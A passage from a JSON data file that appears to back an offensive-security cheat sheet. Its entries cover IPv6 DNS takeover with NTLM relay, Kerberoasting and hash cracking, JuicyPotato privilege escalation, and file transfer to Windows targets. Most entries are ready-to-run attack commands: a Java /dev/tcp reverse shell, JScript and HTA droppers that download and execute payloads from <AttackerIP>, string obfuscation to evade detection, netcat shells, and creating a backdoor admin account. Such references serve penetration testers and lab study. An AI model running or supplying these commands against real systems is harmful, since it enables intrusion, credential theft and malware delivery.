            "lang": "bash",
            "code": "docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf\n# Upload IPA to http://localhost:8000"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Frida",
        "url": "https://frida.re/docs/ios/"
      },
      {
        "text": "Objection",
        "url": "https://github.com/sensepost/objection"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Runtime analysis with proxy interception and **Frida** instrumentation."
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "IPv6 Attacks",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Prerequisites",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- mitm6 for IPv6 DNS spoofing\n- ntlmrelayx for credential relay\n- LDAP signing not enforced on Domain Controller"
          }
        ]
      },
      {
        "title": "Install mitm6",
        "codes": [
          {
            "lang": "bash",
            "code": "pip3 install mitm6"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "IPv6 DNS Takeover + LDAP Relay",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo mitm6 -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<Domain> -l loot"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Run in separate terminals. Responds to DHCPv6 requests, sets attacker as DNS server."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "`-6` enables IPv6 | `-wh` hosts WPAD file | `-l` dumps to loot directory\nWhen a machine authenticates: credentials relayed to LDAP, domain data dumped, DA can create accounts."
          }
        ]
      },
      {
        "title": "Delegate User Creation",
        "codes": [
          {
            "lang": "bash",
            "code": "ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<Domain> --delegate-access"
          },
          {
            "lang": "bash",
            "code": "getST.py -spn cifs/<TargetHost>.<Domain> '<Domain>/<ComputerAccount$>:<Password>' -impersonate Administrator\nexport KRB5CCNAME=Administrator.ccache\nsecretsdump.py -k -no-pass <Domain>/Administrator@<TargetHost>.<Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If relayed account has rights, ntlmrelayx can create computer account for persistence."
          }
        ]
      },
      {
        "title": "Verify LDAP Signing",
        "codes": [
          {
            "lang": "bash",
            "code": "netexec ldap <DC_IP> -u '' -p '' -M ldap-checker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "If LDAP signing not enforced, attack will work."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "mitm6",
        "url": "https://github.com/dirkjanm/mitm6"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Exploit IPv6 in Windows environments where it's enabled by default but rarely configured.\n**Attack vectors:** IPv6 DNS takeover, WPAD spoofing, LDAP relay, credential capture."
      }
    ]
  },
  {
    "category": "NTLM Relay",
    "title": "IPv6 DNS Takeover",
    "tags": [
      "Lateral_Movement",
      "NTLM",
      "NTLM_Relay",
      "SMB",
      "Windows"
    ],
    "steps": [
      {
        "title": "mitm6 with NTLM Relay",
        "codes": [
          {
            "lang": "bash",
            "code": "mitm6 -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "impacket-ntlmrelayx -6 -wh <AttackerIP> -t ldaps://<DC_IP> -l loot --delegate-access"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "mitm6 Blog",
        "url": "https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Abuse IPv6 DNS to redirect WPAD/auth requests. Effective in dual-stack networks.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Reverse Shells",
    "title": "Java Reverse Shell",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```java\nr = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/<AttackerIP>/<Port>;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\np.waitFor()\n```"
      }
    ]
  },
  {
    "category": "Just Enough Administration (JEA)",
    "title": "JEA Configuration Review",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "Find Role Capability Files",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ChildItem \"C:\\Program Files\\WindowsPowerShell\\Modules\" -Recurse -Filter \"*.psrc\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Read Role Capabilities",
        "codes": [
          {
            "lang": "powershell",
            "code": "Import-PowerShellDataFile \"<Path>\\RoleCapability.psrc\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Session Configuration Files",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ChildItem \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\SessionConfig\" -Filter \"*.pssc\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Attacks",
    "title": "John the Ripper",
    "tags": [
      "Credential_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Basic Attack",
        "codes": [
          {
            "lang": "bash",
            "code": "john --wordlist=/usr/share/wordlists/rockyou.txt <HashFile>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Show Cracked",
        "codes": [
          {
            "lang": "bash",
            "code": "john --show <HashFile>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Specific Format",
        "codes": [
          {
            "lang": "bash",
            "code": "john <HashFile> --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Crack /etc/shadow",
        "codes": [
          {
            "lang": "bash",
            "code": "unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SSH Key",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh2john id_rsa > ssh.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "ZIP File",
        "codes": [
          {
            "lang": "bash",
            "code": "zip2john archive.zip > zip.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt zip.hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "RAR File",
        "codes": [
          {
            "lang": "bash",
            "code": "rar2john archive.rar > rar.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt rar.hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PDF",
        "codes": [
          {
            "lang": "bash",
            "code": "pdf2john document.pdf > pdf.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "JScript Droppers",
    "title": "JScript Execution on Windows",
    "tags": [
      "Defense_Evasion",
      "Execution",
      "Initial_Access",
      "Python",
      "Windows"
    ],
    "steps": [
      {
        "title": "JScript File Execution",
        "codes": [
          {
            "lang": "bash",
            "code": "wscript.exe payload.js\ncscript.exe payload.js"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Basic JScript Dropper",
        "substeps": [
          {
            "title": "Shell Command Execution",
            "codes": [
              {
                "lang": "javascript",
                "code": "var shell = new ActiveXObject(\"WScript.Shell\");\nshell.Run(\"calc.exe\", 0, false);"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Download and Execute",
            "codes": [
              {
                "lang": "javascript",
                "code": "var shell = new ActiveXObject(\"WScript.Shell\");\nvar xhr = new ActiveXObject(\"MSXML2.XMLHTTP\");\nvar stream = new ActiveXObject(\"ADODB.Stream\");\n\nxhr.Open(\"GET\", \"http://<AttackerIP>/payload.exe\", false);\nxhr.Send();\n\nstream.Open();\nstream.Type = 1;\nstream.Write(xhr.ResponseBody);\nstream.Position = 0;\nstream.SaveToFile(\"C:\\\\Windows\\\\Temp\\\\payload.exe\", 2);\nstream.Close();\n\nshell.Run(\"C:\\\\Windows\\\\Temp\\\\payload.exe\", 0, false);"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "JScript Meterpreter Dropper",
        "substeps": [
          {
            "title": "PowerShell via JScript",
            "codes": [
              {
                "lang": "javascript",
                "code": "var shell = new ActiveXObject(\"WScript.Shell\");\nvar cmd = \"powershell -exec bypass -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')\\\"\";\nshell.Run(cmd, 0, false);"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Encoded PowerShell via JScript",
            "codes": [
              {
                "lang": "javascript",
                "code": "var shell = new ActiveXObject(\"WScript.Shell\");\nvar cmd = \"powershell -exec bypass -nop -w hidden -enc <Base64EncodedCommand>\";\nshell.Run(cmd, 0, false);"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "JScript with HTA Container",
        "substeps": [
          {
            "title": "Basic HTA Dropper",
            "codes": [
              {
                "lang": "html",
                "code": "<html>\n<head>\n<script language=\"JScript\">\nvar shell = new ActiveXObject(\"WScript.Shell\");\nshell.Run(\"powershell -exec bypass -nop -w hidden -enc <Base64>\", 0, false);\nwindow.close();\n</script>\n</head>\n<body>\n</body>\n</html>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Save and Execute",
            "codes": [
              {
                "lang": "bash",
                "code": "mshta.exe http://<AttackerIP>/payload.hta"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "HTML Application provides additional capabilities and different execution context.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "JScript String Obfuscation",
        "codes": [
          {
            "lang": "javascript",
            "code": "var shell = new ActiveXObject(\"WScript.Shell\");\nvar p = \"pow\" + \"ersh\" + \"ell\";\nvar c = \" -ex\" + \"ec by\" + \"pass -n\" + \"op -w hid\" + \"den -c \";\nvar d = \"\\\"IEX(New-Object Net.WebClient).Down\" + \"loadString('http://<AttackerIP>/p.ps1')\\\"\";\nshell.Run(p + c + d, 0, false);"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Break up suspicious strings to evade detection.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Microsoft WSH Reference",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738350(v=ws.10"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "JScript runs via Windows Script Host (**wscript.exe** or **cscript.exe**). Alternative to PowerShell for initial access.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "JuicyPotato (Legacy)",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Check Compatibility",
        "codes": [
          {
            "lang": "powershell",
            "code": "(Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\").CurrentBuild -lt 17763"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Download",
        "codes": [
          {
            "lang": "powershell",
            "code": "iwr -uri http://<KaliIP>/JuicyPotato.exe -Outfile JuicyPotato.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common CLSIDs",
        "codes": [
          {
            "lang": "plaintext",
            "code": "# Windows 10 Enterprise\n{03ca98d6-ff5d-49b8-abc6-03dd84127020}\n\n# Windows Server 2016\n{4991d34b-80a1-4291-83b6-3328366b9097}\n\n# Windows Server 2012\n{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Basic Usage",
        "codes": [
          {
            "lang": "bash",
            "code": "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\" -t *"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "With CLSID",
        "codes": [
          {
            "lang": "bash",
            "code": "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\nc.exe -a \"<AttackerIP> <Port> -e cmd.exe\" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Test Multiple CLSIDs",
        "codes": [
          {
            "lang": "bash",
            "code": "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "If one CLSID fails, try others from the [CLSID list](https://github.com/ohpe/juicy-potato/tree/master/CLSID) for your OS version.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "JuicyPotato GitHub",
        "url": "https://github.com/ohpe/juicy-potato"
      },
      {
        "text": "CLSID List",
        "url": "https://github.com/ohpe/juicy-potato/tree/master/CLSID"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**Legacy tool** for Windows 7-10 pre-1809 and Server 2008-2016 only. Does NOT work on modern Windows. Requires valid CLSID.",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "JuicyPotatoNG",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Download",
        "codes": [
          {
            "lang": "powershell",
            "code": "iwr -uri http://<KaliIP>/JuicyPotatoNG.exe -Outfile JuicyPotatoNG.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Basic Usage",
        "codes": [
          {
            "lang": "bash",
            "code": "JuicyPotatoNG.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -a \"/c whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Reverse Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "JuicyPotatoNG.exe -t * -p \"C:\\Windows\\Temp\\nc.exe\" -a \"<AttackerIP> <Port> -e cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add User",
        "codes": [
          {
            "lang": "bash",
            "code": "JuicyPotatoNG.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -a \"/c net user hacker Password123! /add && net localgroup administrators hacker /add\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Write Output to File",
        "codes": [
          {
            "lang": "bash",
            "code": "JuicyPotatoNG.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -a \"/c whoami > C:\\Temp\\out.txt\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "JuicyPotatoNG GitHub",
        "url": "https://github.com/antonioCoco/JuicyPotatoNG"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Updated version of JuicyPotato for modern Windows (Server 2012-2022, Win10-11). No CLSID needed!",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Just Enough Administration (JEA)",
    "title": "Just Enough Administration Theory",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "JEA Components",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Role Capabilities (.psrc)** - Define allowed commands\n- **Session Configurations (.pssc)** - Define who can connect and which roles\n- **Virtual Accounts** - Sessions run as temporary admin accounts"
          }
        ]
      },
      {
        "title": "JEA Restrictions",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "JEA limitations to bypass:\n- Limited cmdlets available\n- No direct file system access\n- No arbitrary command execution\n- Transcription logging enabled",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Microsoft JEA Documentation",
        "url": "https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**JEA** creates constrained PowerShell sessions with limited cmdlets. Users connect via PowerShell Remoting with restricted capabilities.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Just-In-Time (JIT) Access",
    "title": "Just-In-Time Administration Theory",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "JIT Components",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **PAM Trust** - Shadow forest for managing privileged access\n- **Shadow Principals** - Mirrored accounts in PAM forest\n- **Time-Based Groups** - Membership expires after set duration\n- **Request Workflow** - Approval process for access"
          }
        ]
      },
      {
        "title": "How JIT Works",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "JIT workflow:\n1. User requests privileged access\n2. Request is approved (manual or automatic)\n3. User added to shadow group with TTL\n4. User accesses resources using shadow principal\n5. After TTL expires, membership removed",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Microsoft PAM Documentation",
        "url": "https://learn.microsoft.com/en-us/microsoft-identity-manager/pam/privileged-identity-management-for-active-directory-domain-services"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**JIT** provides time-limited privileged access. Users request access, receive temporary group membership, access expires automatically.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "File Transfer Techniques",
    "title": "Kali to Windows (Upload)",
    "tags": [],
    "steps": [
      {
        "title": "Using impacket-smbserver",
        "substeps": [
          {
            "title": "Setup SMB Server",
            "codes": [
              {
                "lang": "bash",
                "code": "impacket-smbserver share /opt/tools -smb2support"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Download Files",
            "codes": [
              {
                "lang": "bash",
                "code": "# Copy from Kali to Windows\ncopy \\\\<KaliIP>\\share\\nc.exe C:\\Windows\\Temp\\\n\n# Execute directly from share\n\\\\<KaliIP>\\share\\nc.exe -h"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using HTTP Server",
        "substeps": [
          {
            "title": "Setup HTTP Server",
            "codes": [
              {
                "lang": "bash",
                "code": "# Python HTTP server\npython3 -m http.server 80\n\n# Specify directory\npython3 -m http.server 80 --directory /opt/tools"
              },
              {
                "lang": "bash",
                "code": "# PHP HTTP server\nphp -S 0.0.0.0:80"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Download Files",
            "codes": [
              {
                "lang": "powershell",
                "code": "# PowerShell - Invoke-WebRequest\niwr -uri http://<KaliIP>/nc.exe -Outfile nc.exe\n\n# PowerShell - WebClient\n(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/nc.exe','nc.exe')"
              },
              {
                "lang": "bash",
                "code": "# certutil\ncertutil -urlcache -split -f \"http://<KaliIP>/nc.exe\" nc.exe\n\n# bitsadmin\nbitsadmin /transfer myDownload /download /priority high http://<KaliIP>/nc.exe C:\\Windows\\Temp\\nc.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using PowerShell",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Download and execute in memory\nIEX(New-Object Net.WebClient).DownloadString('http://<KaliIP>/script.ps1')\n\n# Download file\nInvoke-WebRequest -Uri http://<KaliIP>/file.exe -Outfile file.exe\n\n# Alternative\nwget http://<KaliIP>/file.exe -O file.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using curl (if available)",
        "codes": [
          {
            "lang": "bash",
            "code": "curl http://<KaliIP>/file.exe -o file.exe\ncurl http://<KaliIP>/file.exe --output file.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Reverse Shells",
    "title": "Kali Webshells Location [optional]",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\nls /usr/share/webshells/\n```"
      },
      {
        "type": "note",
        "content": "Common webshells:\n- `/usr/share/webshells/php/php-reverse-shell.php`\n- `/usr/share/webshells/php/simple-backdoor.php`\n- `/usr/share/webshells/asp/`\n- `/usr/share/webshells/jsp/`",
        "variant": "info"
      }
    ]
  },
  {
    "category": "AD Object Permission Abuse",
    "title": "Kerberoastable User Creation",
    "tags": [
      "Active_Directory",
      "BloodHound",
      "LDAP",
      "PowerShell",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Add SPN to User with GenericAll/GenericWrite",
        "codes": [
          {
            "lang": "powershell",
            "code": "Set-DomainObject -Identity <TargetUser> -Set @{serviceprincipalname='fake/service'}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Then Kerberoast",
        "codes": [
          {
            "lang": "bash",
            "code": "Rubeus.exe kerberoast /user:<TargetUser> /outfile:hash.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Remove SPN (Cleanup)",
        "codes": [
          {
            "lang": "powershell",
            "code": "Set-DomainObject -Identity <TargetUser> -Clear serviceprincipalname"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Kerberoasting",
    "title": "Kerberoasting",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Find Kerberoastable Accounts",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName | Select-Object SamAccountName,ServicePrincipalName"
          },
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe kerberoast /stats"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find with Hackles (BloodHound)",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p '<Neo4jPassword>' --kerberoastable"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Kerberoast with Rubeus",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt"
          },
          {
            "lang": "powershell",
            "code": "# Target specific user\n.\\Rubeus.exe kerberoast /user:<ServiceAccount> /outfile:kerberoast_hashes.txt"
          },
          {
            "lang": "powershell",
            "code": "# Request RC4 (easier to crack but more detectable)\n.\\Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Kerberoast from Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetUserSPNs <Domain>/<Username>:<Password> -dc-ip <DC_IP> -request -outputfile kerberoast.txt"
          },
          {
            "lang": "bash",
            "code": "# Pass the hash\nimpacket-GetUserSPNs -hashes :<NTLMHash> <Domain>/<Username> -dc-ip <DC_IP> -request -outputfile kerberoast.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Kerberoast with NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <Username> -p '<Password>' --kerberoasting kerberoast.txt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Crack Hashes - RC4",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 13100 kerberoast.txt rockyou.txt -r /opt/hashcat/rules/best64.rule"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Crack Hashes - AES-256",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 19700 kerberoast.txt rockyou.txt -r /opt/hashcat/rules/best64.rule"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Validate Cracked Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DC_IP> -u <ServiceAccount> -p '<CrackedPassword>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "# Check for admin access across subnet\nnxc smb 192.168.1.0/24 -u <ServiceAccount> -p '<CrackedPassword>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "HackTricks Kerberoasting",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Request TGS tickets for service accounts (accounts with SPNs) and crack offline. Any domain user can request these tickets.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Kerberoasting",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Request TGS Tickets",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetUserSPNs -request -dc-ip <DC_IP> <Domain>/<User>:<Pass>\nimpacket-GetUserSPNs -request -dc-ip <DC_IP> <Domain>/<User> -hashes :<NTHash>\nimpacket-GetUserSPNs -request -dc-ip <DC_IP> <Domain>/<User>:<Pass> -outputfile tgs.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Any authenticated user can request service tickets. Crack offline to get service account passwords.\n**Weak targets:** Service accounts with SPNs (HTTP/, MSSQL/, CIFS/), non-random passwords, high-privilege accounts."
          }
        ]
      },
      {
        "title": "Kerberoasting - NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p <Pass> --kerberoasting kerberoast.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Kerberoasting - Rubeus (Windows)",
        "codes": [
          {
            "lang": "powershell",
            "code": "Rubeus.exe kerberoast /outfile:tgs.txt\nRubeus.exe kerberoast /user:<TargetUser> /nowrap"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Crack TGS Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Crack AES-256 Kerberoast Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Some environments use AES encryption instead of RC4."
          }
        ]
      },
      {
        "title": "Targeted Kerberoasting",
        "substeps": [
          {
            "title": "Add Fake SPN - PowerShell",
            "codes": [
              {
                "lang": "powershell",
                "code": "Set-DomainObject -Identity <TargetUser> -SET @{serviceprincipalname='fake/spn'}"
              },
              {
                "lang": "powershell",
                "code": "$user = Get-ADUser -Identity <TargetUser>\n$currentSPNs = $user.ServicePrincipalNames\nSet-ADUser -Identity <TargetUser> -ServicePrincipalNames ($currentSPNs + \"HTTP/fakehost.<Domain>\")"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Using setspn",
            "codes": [
              {
                "lang": "bash",
                "code": "setspn -S HTTP/fakehost.<Domain> <TargetUser>"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
